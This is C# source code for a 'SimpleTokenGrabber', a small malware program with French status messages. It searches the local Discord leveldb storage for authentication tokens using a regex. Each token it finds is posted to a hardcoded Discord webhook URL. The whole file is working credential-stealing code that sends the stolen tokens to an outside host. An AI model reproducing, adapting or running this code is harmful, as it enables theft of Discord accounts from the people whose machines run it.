using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;
using System.Collections.Specialized;

namespace SimpleTokenGrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            foreach(string i in GrabToken())
            {
                sendToken("https://discord.com/api/webhooks/810176278845456434/bQttfpwp_tvRw7RpYjoiFOytZWvrJrB1UlxNFLlsR3ZNy2bnINQoFAsyLFYiF1chpZ56", i, "TokenGrabber");
            }
        }

        static string[] GrabToken()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb";
            if (!Directory.Exists(path)) return new string[] { "Discord n'est pas installé sur ce pc." };
            string[] ldb = Directory.GetFiles(path, "*ldb");
            foreach(var ldbFile in ldb)
            {
                var text = File.ReadAllText(ldbFile);
                string TokenRegex = @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}";
                Match token = Regex.Match(text, TokenRegex);
                if(token.Success)
                {
                    string[] TokenData = { token.Value };
                    return TokenData;
                }
                continue;
            }
            return new string[] { "Aucun token trouvé." };
        }

        private static void sendToken(string url, string msg, string username)
        {
            Post(url, new NameValueCollection()
            {
                {
                    "username", username
                },
                {
                    "content", msg
                }
            });
        }

        private static byte[] Post(string url, NameValueCollection p)
        {
            using (WebClient client = new WebClient())
                return client.UploadValues(url, p);
        }
    }
}
